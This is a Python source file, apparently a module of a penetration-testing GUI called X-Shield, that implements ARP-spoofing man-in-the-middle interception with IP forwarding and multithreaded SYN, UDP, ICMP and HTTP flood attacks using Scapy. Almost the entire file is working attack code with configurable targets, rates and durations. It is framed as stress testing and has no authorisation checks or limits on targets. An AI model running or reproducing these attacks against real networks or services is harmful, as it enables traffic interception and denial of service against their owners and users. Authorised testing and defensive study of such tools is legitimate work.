"""
Attack/Stress Module for X-Shield Framework
MITM (ARP Spoofing) and DoS/DDoS testing modules
"""

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.base_module import NetworkModule
import time
import threading
import socket
import random
import struct
import os
from concurrent.futures import ThreadPoolExecutor
from PySide6.QtCore import Signal, Slot

try:
    from scapy.all import ARP, Ether, srp, send, IP, TCP, UDP, ICMP, RandIP, RandShort
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


class Module(NetworkModule):
    """Attack/Stress Module - inherits from NetworkModule (which inherits from QObject)"""
    
    NAME = "Attack/Stress"
    DESCRIPTION = "MITM (ARP Spoofing) and DoS/DDoS testing modules"
    VERSION = "1.0.0"
    AUTHOR = "X-Shield Team"
    CATEGORY = "Attack"
    
    # Signals
    attack_progress = Signal(int, int)  # current, total
    attack_status = Signal(str)  # status message
    packet_sent = Signal(str, int)  # packet_type, count
    attack_complete = Signal(dict)  # final results
    
    PARAMETERS = {
        'attack_type': {
            'type': 'choice',
            'label': 'Attack Type',
            'default': 'arp_spoof',
            'choices': ['arp_spoof', 'syn_flood', 'udp_flood', 'icmp_flood', 'http_flood'],
            'description': 'Type of attack to perform'
        },
        'target': {
            'type': 'string',
            'label': 'Target',
            'default': '192.168.1.1',
            'description': 'Target IP address or URL'
        },
        'gateway': {
            'type': 'string',
            'label': 'Gateway',
            'default': '192.168.1.254',
            'description': 'Gateway IP address (for ARP spoofing)'
        },
        'interface': {
            'type': 'string',
            'label': 'Interface',
            'default': 'eth0',
            'description': 'Network interface to use'
        },
        'packets_per_second': {
            'type': 'integer',
            'label': 'Packets Per Second',
            'default': 1000,
            'min': 10,
            'max': 10000,
            'description': 'Number of packets to send per second'
        },
        'duration': {
            'type': 'integer',
            'label': 'Duration (seconds)',
            'default': 60,
            'min': 10,
            'max': 3600,
            'description': 'Attack duration in seconds'
        },
        'threads': {
            'type': 'integer',
            'label': 'Threads',
            'default': 10,
            'min': 1,
            'max': 100,
            'description': 'Number of attack threads'
        },
        'source_port': {
            'type': 'integer',
            'label': 'Source Port',
            'default': 0,
            'min': 0,
            'max': 65535,
            'description': 'Source port (0 for random)'
        },
        'destination_port': {
            'type': 'integer',
            'label': 'Destination Port',
            'default': 80,
            'min': 1,
            'max': 65535,
            'description': 'Destination port'
        },
        'enable_ip_forwarding': {
            'type': 'boolean',
            'label': 'Enable IP Forwarding',
            'default': True,
            'description': 'Enable IP forwarding for MITM attacks'
        }
    }
    
    def __init__(self, logger):
        super().__init__(logger)
        self._stop_requested = False
        self._is_running = False
        self.original_ip_forwarding = None
        
        # Results storage
        self.results = {
            'module_name': self.NAME,
            'start_time': None,
            'end_time': None,
            'execution_time': 0,
            'target': None,
            'parameters': {},
            'findings': [],
            'vulnerabilities': [],
            'items_scanned': 0,
            'summary': '',
            'status': 'not_started'
        }
    
    def execute(self, target: str, parameters: dict) -> dict:
        """Execute attack/stress test"""
        try:
            if not SCAPY_AVAILABLE:
                raise ImportError("Scapy is required for attack/stress modules")
            
            self._start_execution(target, parameters)
            
            attack_type = parameters.get('attack_type', 'arp_spoof')
            
            if attack_type == 'arp_spoof':
                results = self._arp_spoof_attack(target, parameters)
            elif attack_type == 'syn_flood':
                results = self._syn_flood_attack(target, parameters)
            elif attack_type == 'udp_flood':
                results = self._udp_flood_attack(target, parameters)
            elif attack_type == 'icmp_flood':
                results = self._icmp_flood_attack(target, parameters)
            elif attack_type == 'http_flood':
                results = self._http_flood_attack(target, parameters)
            else:
                raise ValueError(f"Unknown attack type: {attack_type}")
            
            self._finish_execution()
            self.attack_complete.emit(self.results)
            return self.results
            
        except Exception as e:
            self._handle_error(e)
            return self.results
    
    def _arp_spoof_attack(self, target: str, parameters: dict) -> dict:
        """Perform ARP spoofing attack (MITM)"""
        self.attack_status.emit(f"Starting ARP spoofing attack on {target}")
        
        gateway = parameters.get('gateway', '192.168.1.254')
        interface = parameters.get('interface', 'eth0')
        enable_ip_forwarding = parameters.get('enable_ip_forwarding', True)
        
        # Enable IP forwarding if required
        if enable_ip_forwarding:
            self._enable_ip_forwarding()
        
        try:
            # Get MAC addresses
            target_mac = self._get_mac(target)
            gateway_mac = self._get_mac(gateway)
            
            if not target_mac or not gateway_mac:
                raise Exception("Could not resolve MAC addresses")
            
            self.attack_status.emit(f"Target MAC: {target_mac}, Gateway MAC: {gateway_mac}")
            
            # Create ARP packets
            target_packet = ARP(op=2, pdst=target, psrc=gateway, hwdst=target_mac)
            gateway_packet = ARP(op=2, pdst=gateway, psrc=target, hwdst=gateway_mac)
            
            packets_sent = 0
            start_time = time.time()
            
            while not self._stop_requested:
                # Send ARP packets
                send(target_packet, verbose=0)
                send(gateway_packet, verbose=0)
                
                packets_sent += 2
                self.packet_sent.emit('ARP', packets_sent)
                self.increment_items_scanned()
                
                # Small delay
                time.sleep(0.1)
            
            execution_time = time.time() - start_time
            
            self.add_finding('arp_spoof_results', {
                'target': target,
                'gateway': gateway,
                'target_mac': target_mac,
                'gateway_mac': gateway_mac,
                'packets_sent': packets_sent,
                'duration': execution_time
            })
            
            self.set_summary(f"ARP spoofing completed. Sent {packets_sent} packets in {execution_time:.2f} seconds")
            
            # Add vulnerability finding
            vulnerability = {
                'title': 'ARP Spoofing Vulnerability',
                'severity': 'high',
                'description': f'Network is vulnerable to ARP spoofing attacks',
                'target': f"{target} <-> {gateway}",
                'packets_sent': packets_sent,
                'recommendation': 'Implement dynamic ARP inspection and port security'
            }
            self.add_vulnerability(vulnerability)
            
        finally:
            # Restore IP forwarding
            if enable_ip_forwarding:
                self._disable_ip_forwarding()
        
        return self.results
    
    def _syn_flood_attack(self, target: str, parameters: dict) -> dict:
        """Perform SYN flood attack"""
        self.attack_status.emit(f"Starting SYN flood attack on {target}")
        
        packets_per_second = parameters.get('packets_per_second', 1000)
        duration = parameters.get('duration', 60)
        threads = parameters.get('threads', 10)
        source_port = parameters.get('source_port', 0)
        destination_port = parameters.get('destination_port', 80)
        
        packets_sent = 0
        start_time = time.time()
        
        def send_syn_packets():
            nonlocal packets_sent
            
            while not self._stop_requested and (time.time() - start_time) < duration:
                try:
                    # Create SYN packet
                    if source_port == 0:
                        src_port = RandShort()
                    else:
                        src_port = source_port
                    
                    packet = IP(dst=target) / TCP(sport=src_port, dport=destination_port, flags="S")
                    send(packet, verbose=0)
                    
                    packets_sent += 1
                    self.packet_sent.emit('SYN', packets_sent)
                    self.increment_items_scanned()
                    
                    # Rate limiting
                    time.sleep(1.0 / packets_per_second)
                    
                except Exception as e:
                    self.logger.error(f"Error sending SYN packet: {str(e)}")
        
        # Start multiple threads
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(send_syn_packets) for _ in range(threads)]
            
            for future in futures:
                future.result()
        
        execution_time = time.time() - start_time
        
        self.add_finding('syn_flood_results', {
            'target': target,
            'packets_sent': packets_sent,
            'duration': execution_time,
            'packets_per_second': packets_sent / execution_time if execution_time > 0 else 0,
            'destination_port': destination_port
        })
        
        self.set_summary(f"SYN flood completed. Sent {packets_sent} packets in {execution_time:.2f} seconds")
        
        return self.results
    
    def _udp_flood_attack(self, target: str, parameters: dict) -> dict:
        """Perform UDP flood attack"""
        self.attack_status.emit(f"Starting UDP flood attack on {target}")
        
        packets_per_second = parameters.get('packets_per_second', 1000)
        duration = parameters.get('duration', 60)
        threads = parameters.get('threads', 10)
        source_port = parameters.get('source_port', 0)
        destination_port = parameters.get('destination_port', 53)
        
        packets_sent = 0
        start_time = time.time()
        
        def send_udp_packets():
            nonlocal packets_sent
            
            while not self._stop_requested and (time.time() - start_time) < duration:
                try:
                    # Create UDP packet
                    if source_port == 0:
                        src_port = RandShort()
                    else:
                        src_port = source_port
                    
                    packet = IP(dst=target) / UDP(sport=src_port, dport=destination_port) / b"A" * 1024
                    send(packet, verbose=0)
                    
                    packets_sent += 1
                    self.packet_sent.emit('UDP', packets_sent)
                    self.increment_items_scanned()
                    
                    # Rate limiting
                    time.sleep(1.0 / packets_per_second)
                    
                except Exception as e:
                    self.logger.error(f"Error sending UDP packet: {str(e)}")
        
        # Start multiple threads
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(send_udp_packets) for _ in range(threads)]
            
            for future in futures:
                future.result()
        
        execution_time = time.time() - start_time
        
        self.add_finding('udp_flood_results', {
            'target': target,
            'packets_sent': packets_sent,
            'duration': execution_time,
            'packets_per_second': packets_sent / execution_time if execution_time > 0 else 0,
            'destination_port': destination_port,
            'packet_size': 1024
        })
        
        self.set_summary(f"UDP flood completed. Sent {packets_sent} packets in {execution_time:.2f} seconds")
        
        return self.results
    
    def _icmp_flood_attack(self, target: str, parameters: dict) -> dict:
        """Perform ICMP flood attack (ping flood)"""
        self.attack_status.emit(f"Starting ICMP flood attack on {target}")
        
        packets_per_second = parameters.get('packets_per_second', 1000)
        duration = parameters.get('duration', 60)
        threads = parameters.get('threads', 10)
        
        packets_sent = 0
        start_time = time.time()
        
        def send_icmp_packets():
            nonlocal packets_sent
            
            while not self._stop_requested and (time.time() - start_time) < duration:
                try:
                    # Create ICMP packet
                    packet = IP(dst=target) / ICMP()
                    send(packet, verbose=0)
                    
                    packets_sent += 1
                    self.packet_sent.emit('ICMP', packets_sent)
                    self.increment_items_scanned()
                    
                    # Rate limiting
                    time.sleep(1.0 / packets_per_second)
                    
                except Exception as e:
                    self.logger.error(f"Error sending ICMP packet: {str(e)}")
        
        # Start multiple threads
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(send_icmp_packets) for _ in range(threads)]
            
            for future in futures:
                future.result()
        
        execution_time = time.time() - start_time
        
        self.add_finding('icmp_flood_results', {
            'target': target,
            'packets_sent': packets_sent,
            'duration': execution_time,
            'packets_per_second': packets_sent / execution_time if execution_time > 0 else 0
        })
        
        self.set_summary(f"ICMP flood completed. Sent {packets_sent} packets in {execution_time:.2f} seconds")
        
        return self.results
    
    def _http_flood_attack(self, target: str, parameters: dict) -> dict:
        """Perform HTTP flood attack"""
        self.attack_status.emit(f"Starting HTTP flood attack on {target}")
        
        try:
            import requests
        except ImportError:
            self.attack_status.emit("Requests library not available for HTTP flood")
            return self.results
        
        packets_per_second = parameters.get('packets_per_second', 100)
        duration = parameters.get('duration', 60)
        threads = parameters.get('threads', 10)
        
        requests_sent = 0
        start_time = time.time()
        
        def send_http_requests():
            nonlocal requests_sent
            
            while not self._stop_requested and (time.time() - start_time) < duration:
                try:
                    # Create HTTP request
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1'
                    }
                    
                    response = requests.get(target, headers=headers, timeout=5)
                    requests_sent += 1
                    
                    self.packet_sent.emit('HTTP', requests_sent)
                    self.increment_items_scanned()
                    
                    # Rate limiting
                    time.sleep(1.0 / packets_per_second)
                    
                except Exception as e:
                    self.logger.error(f"Error sending HTTP request: {str(e)}")
        
        # Start multiple threads
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(send_http_requests) for _ in range(threads)]
            
            for future in futures:
                future.result()
        
        execution_time = time.time() - start_time
        
        self.add_finding('http_flood_results', {
            'target': target,
            'requests_sent': requests_sent,
            'duration': execution_time,
            'requests_per_second': requests_sent / execution_time if execution_time > 0 else 0
        })
        
        self.set_summary(f"HTTP flood completed. Sent {requests_sent} requests in {execution_time:.2f} seconds")
        
        return self.results
    
    def _get_mac(self, ip_address: str) -> str:
        """Get MAC address for IP"""
        try:
            # Create ARP request
            arp_request = ARP(pdst=ip_address)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            # Send and receive
            answered_list, unanswered_list = srp(arp_request_broadcast, timeout=2, verbose=False)
            
            if answered_list:
                return answered_list[0][1].hwsrc
            
        except Exception as e:
            self.logger.error(f"Error getting MAC for {ip_address}: {str(e)}")
        
        return None
    
    def _enable_ip_forwarding(self):
        """Enable IP forwarding for MITM attacks"""
        try:
            if os.name == 'posix':  # Linux/Unix
                # Save current state
                with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
                    self.original_ip_forwarding = f.read().strip()
                
                # Enable IP forwarding
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write('1')
                
                self.attack_status.emit("IP forwarding enabled")
                
            elif os.name == 'nt':  # Windows
                # Windows IP forwarding (requires admin)
                import subprocess
                subprocess.run(['netsh', 'interface', 'ipv4', 'set', 'global', 'forwarding=enabled'], 
                             check=True, capture_output=True)
                self.attack_status.emit("IP forwarding enabled")
                
        except Exception as e:
            self.logger.error(f"Error enabling IP forwarding: {str(e)}")
    
    def _disable_ip_forwarding(self):
        """Restore IP forwarding state"""
        try:
            if self.original_ip_forwarding is not None and os.name == 'posix':
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write(self.original_ip_forwarding)
                self.attack_status.emit("IP forwarding restored")
                
            elif os.name == 'nt':  # Windows
                import subprocess
                subprocess.run(['netsh', 'interface', 'ipv4', 'set', 'global', 'forwarding=disabled'], 
                             check=True, capture_output=True)
                self.attack_status.emit("IP forwarding disabled")
                
        except Exception as e:
            self.logger.error(f"Error disabling IP forwarding: {str(e)}")
    
    @Slot()
    def stop(self):
        """Stop module execution"""
        self._stop_requested = True
        self._is_running = False
        self.logger.info(f"Stop requested for module {self.NAME}")
        self.attack_status.emit("Attack stopped by user")
        
        # Restore IP forwarding if it was changed
        if self.original_ip_forwarding is not None:
            self._disable_ip_forwarding()
